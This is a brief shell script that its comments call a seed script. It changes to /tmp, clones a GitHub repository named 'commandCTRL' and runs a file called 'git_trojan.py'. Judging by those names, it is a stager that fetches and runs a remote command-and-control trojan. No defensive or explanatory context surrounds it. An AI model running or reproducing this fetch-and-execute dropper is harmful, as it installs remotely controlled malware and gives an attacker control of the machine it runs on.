#!/bin/sh
# IF this file is edited run

# tr -d "\r" < seed_edit.sh > seed.sh
# chmod +x seed.sh
#touch SEEDWASHERE
cd /tmp/
# IF GIT IS NOT INSTALLED ! ! !
#apt-get update
#apt-get install git -y

git clone https://github.com/botboi/commandCTRL

cd commandCTRL

chmod +x git_trojan.py
python git_trojan.py
